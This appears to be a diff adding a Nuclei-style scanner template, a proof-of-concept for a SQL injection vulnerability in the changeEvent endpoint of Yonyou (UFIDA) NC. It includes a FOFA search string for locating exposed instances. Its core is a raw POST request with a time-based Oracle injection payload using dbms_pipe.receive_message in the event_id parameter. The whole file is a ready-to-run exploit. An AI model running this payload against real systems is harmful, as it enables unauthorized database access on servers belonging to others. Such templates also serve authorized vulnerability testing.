@@ -1,0 +1,26 @@
+id: poc-glsk8zk9gqy20xvn
+info:
+  name: 用友NC changeEvent 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/glsk8zk9gqy20xvn'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: glsk8zk9gqy20xvn
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    event_id=1'' AND 1=dbms_pipe.receive_message(''RDS'',5)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
